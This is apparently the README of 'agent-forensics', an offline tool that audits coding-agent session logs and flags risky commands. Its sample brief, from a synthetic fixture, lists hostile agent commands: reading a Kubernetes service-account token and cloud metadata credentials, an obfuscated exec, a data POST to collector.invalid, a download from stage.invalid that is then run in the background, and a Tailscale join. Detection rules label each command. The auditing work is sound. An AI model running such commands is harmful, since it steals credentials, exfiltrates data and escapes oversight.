# agent-forensics

Find out what the agent actually did.

agent-forensics reads the session logs your coding agent already wrote
and prints one page: files built, commands run, boundary crossings,
what to read first, and a receipt you can check. Offline. No model
calls. MIT.

Run it on a session you already have:

```
python3 -m forensics --last --brief
python3 -m forensics <session.jsonl> --brief --out /tmp/recon
```

Saved cursor-agent transcripts:

```
cursor-agent -p --output-format stream-json "do the task" | tee run.jsonl
python3 -m forensics run.jsonl --brief --out /tmp/recon
```

## The output

Unedited brief from the checked-in synthetic fixture
(`forensics/fixtures/synthetic-incident-claude.jsonl`). Every line
below is tool output, not copy:

```
# Session brief

Source: `forensics/fixtures/synthetic-incident-claude.jsonl` (claude), chain OK
Scale: 18 events, 1 prompts, 8 tool calls, 8 results, window 2026-07-15T09:00:00.000Z..2026-07-15T09:09:30.000Z

## Built (0 files)

No file targets recorded in this session.

## Ran (8 commands)

By tool: Bash 8

- `cat /proc/self/mountinfo; cat /etc/passwd | head -5`
- `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
- `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- `python3 -c 'import gzip,base64; exec(gzip.decompress(base64.b64decode("fake")))'`
- `curl -s -X POST https://collector.invalid/p --data @/tmp/env.bin`
- `curl -s -o /tmp/upd https://stage.invalid/upd && chmod +x /tmp/upd`
- `nohup python3 /tmp/upd &`
- `tailscale up --auth-key=tskey-fake`

## Crossed a boundary

Counts: network-egress 3, read-outside-cwd 2, credential-artifact 1

- `2026-07-15T09:01:00.000Z` read-outside-cwd: `cat /proc/self/mountinfo; cat /etc/passwd \| head -5` (recon/recon/proc-net-env)
- `2026-07-15T09:02:00.000Z` credential-artifact, read-outside-cwd: `cat /var/run/secrets/kubernetes.io/serviceaccount/token` (credential-access/cred/k8s-serviceaccount)
- `2026-07-15T09:03:00.000Z` network-egress: `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/` (credential-access/cred/cloud-metadata)
- `2026-07-15T09:05:00.000Z` network-egress: `curl -s -X POST https://collector.invalid/p --data @/tmp/env.bin` (exfil/exfil/outbound-post)
- `2026-07-15T09:06:00.000Z` network-egress: `curl -s -o /tmp/upd https://stage.invalid/upd && chmod +x /tmp/upd` (dropper/dropper/stage-download)

## Worth a look (read first, not a verdict)

1. credential-touch - credential-access/cred/k8s-serviceaccount: references the Kubernetes service-account mount, where a pod's credentials live
   `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
2. outside-cwd - recon/recon/proc-net-env: reads process, environment, or network internals (/proc, /etc/passwd, env, ssh files, interfaces)
   `cat /proc/self/mountinfo; cat /etc/passwd \| head -5`
3. egress+high-risk - credential-access/cred/cloud-metadata: targets a cloud metadata endpoint, where instance credentials live
   `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`
4. egress+high-risk - exfil/exfil/outbound-post: sends data to an external URL (POST, --data, raw socket)
   `curl -s -X POST https://collector.invalid/p --data @/tmp/env.bin`
5. high-risk-match - c2/c2/staged-exec: executes downloaded or staged code (curl|sh, /tmp execution, nohup backgrounding, /dev/tcp)
   `nohup python3 /tmp/upd &`

Receipt: sha256 5a4f343988d142fb..., 18 events. Labels are deterministic rule matches over reconstructed commands - classifications, not accusations.
```

## What it reads

| Agent | Log location | Example |
|---|---|---|
| Claude Code | `~/.claude/projects/<project>/<session>.jsonl` | `session.jsonl` |
| Kimi Code | `~/.kimi-code/sessions/<session>/agents/<agent>/wire.jsonl` | `wire.jsonl` |
| cursor-agent | You save it: `-p --output-format stream-json ... \| tee run.jsonl` | `run.jsonl` |
| Factory Droid | `~/.factory/sessions/<workspace>/<id>.jsonl` | `<id>.jsonl` |

Check the path exists on your machine before you install anything.
Cursor IDE chats are protobuf on disk and not parsed; only saved
cursor-agent transcripts are. Adapters are one file each; PRs welcome.

## The brief, field by field

- **Built:** every file path a tool call targeted. Read-shaped glob
  hits are excluded; a search is not a build.
- **Ran:** shell commands grouped by tool, first distinct commands
  shown. The full stream is in `timeline.md`.
- **Crossed a boundary:** network egress (curl/wget to external
  hosts), credential-artifact touches (agent credential paths, keys,
  kube configs), reads and writes outside the session working dir.
- **Worth a look:** a ranked shortlist, credential touches first,
  then outside-cwd paths, then egress on high-risk matches, at most 2
  per rule so one noisy pattern cannot hide the rest. Highlighted
  means read this one first. It is never a verdict.
- **Receipt:** sha256 of the source file, event counts, chain state.
  The chain proves the integrity of the reconstruction, not of the
  originals.

## Verify the receipt

Each transcript row's sha256 commits to the previous row. Check it
without the tool:

```
python3 -c "from pathlib import Path; from forensics.bundle import verify_file; print(verify_file(Path('forensics/fixtures/demo-bundle/transcript.jsonl')))"
```

Flip one byte in a copy and the same check refuses it. Observed:

```
original: True
tampered: False
```

A broken chain aborts ingestion. It is never a warning.

## Limits

- If the artifacts are gone (ephemeral pods, wiped runners), there is
  nothing to read. Collect before teardown.
- It reads logs, so it sees what the agent recorded and nothing else.
  It is not EDR. It does not catch an agent that never wrote a log
  line. It does not attribute intent.
- Evidence-bundle ingest reconstructs structure only: upstream
  recorders hash tool arguments, so phase labels require native
  session logs.
- Cursor transcripts carry no approval rows; Droid rows carry no
  causal parent links. Known gaps, stated here instead of found by
  you later.

## Get it

```
git clone https://github.com/unauthdev/agent-forensics.git
cd agent-forensics
python3 -m forensics --last --brief
```

Tests (stdlib only; pytest for the suite):

```
python3 -m pip install pytest
python3 -m pytest tests/ -q
```

Offline claim, stated as a test you can run: the tool opens no
sockets. Check with your own strace, Little Snitch, or firewall log
while it runs. Index every local session (all formats, autodetected)
into one chained ledger of aggregates (counts, hashes, time ranges;
paths sanitized, no content):

```
python3 -m forensics --ledger-out /tmp/ledger
```

Ran it on your own session? Open an issue titled "I ran this on my
own session" and paste what the brief surfaced and where the parser
broke, if it did. That issue is the signal this project is decided
by; the bar is written down in `LAUNCH.md`.

## Honesty rules

- Labels are classifications, not accusations. A command labeled recon
  means it matched rule recon/proc-net-env. Nothing more.
- Prompts and assistant text are hashed, never re-emitted. Commands and
  file paths are kept: they are the evidence.
- The chain proves the integrity of the reconstruction, not of the
  originals. The source manifest sha256s the original input files.
- Evidence-bundle ingest reconstructs structure only: upstream recorders
  hash tool arguments, so phase labels require native session logs.

## Contact

security@unauth.dev

MIT license. Copyright (c) 2026 unauth.dev.
